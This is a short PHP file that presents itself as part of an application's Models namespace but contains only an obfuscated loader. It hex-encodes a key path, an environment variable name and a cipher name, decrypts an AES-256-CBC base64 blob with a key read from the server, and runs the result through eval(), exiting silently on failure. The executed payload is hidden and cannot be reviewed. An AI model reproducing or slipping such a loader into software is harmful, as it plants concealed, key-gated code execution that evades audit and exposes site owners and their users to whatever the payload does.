<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ZreHHMNCuHYqakSpP+kvpg==');

$c=base64_decode(

'OT/TVPozgsBO2knFs86sBCtFzt6glRaiajvvcC0biiZHJKTu3JkS01/fBt4Z3JQjHkfpX6jqZciY' .
'+w+o80YT6OzCFMr4NBkRrW6KYmQMH06wspglOiEf7Nih/a54rMfyjXAy5RMO2BSK+EYgo1UbzMYd' .
'DIeDZTvTkzh95nwnY82FyGSb6Bvbl5ZgL4hGoEZ1AKJjGA83qI64RPBQqJ5VRObuWHQHE/gk7qjb' .
'CcghtFqa/f9ww4AVZsa6wcA0in7k1TcgNGwrMOIIzxE9iTECzLSpiu0gJp4W7+Hk/kooxFMYRJ1w' .
'qotMgn8TGPPU8iTjqbYGs19YdU4kDzTkXZyx473xkkxf5Zvdaed5lOPQCAn2Z1GnORJXKhI16Qgr' .
'atj6GWQ3cGjuJjl5nx3xnI9cTTZldHFJhUFOx0P736a8/MlV1B8GCvyc5t+0VNoAJW7/HAqXzoH4' .
'ZoQMsgygFSmls/vQR6u35jCa37HZQOEA6WL6u6Cg/ERcA2eLOMRS9fXGuD5rPQuBfym0e0iRwb3r' .
'dwbdbfHtQkuPbI3WAkTaD2rcr4OJ4XOi9AwszrkWPAJX43MrWneNS0n+vDZ2VO8tcKNRlxBuaF7g' .
'S/K7Wcmj8PAFNdixbha3US5A337I3i7+jP+gZRoD7i23MCGdSNaFlKUYfCQmmmOxUE7cQ6RYQG/N' .
'maHeiKFo5Zm1rvtgl5zfNGOBhT2ihT+0w4XZYhysephmbmNTRD0yrhN7q83U/mszJdaatmD7Nr6i' .
'yCBGEiKH9pmAV0ORY/KVGC9zU3WYkFH2LDL+qj4aSrEU1p6aSBw1ujc7VmfUGElUHh8AcQ9zfI7D' .
'YbjNYWpSBnlavo2C0kjHIzkbQ7xYsUAR/w2txTm09Io0D1A1UVcklpI3Vjo9a6z2tXEf9uWKblrh' .
'66Mm8w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

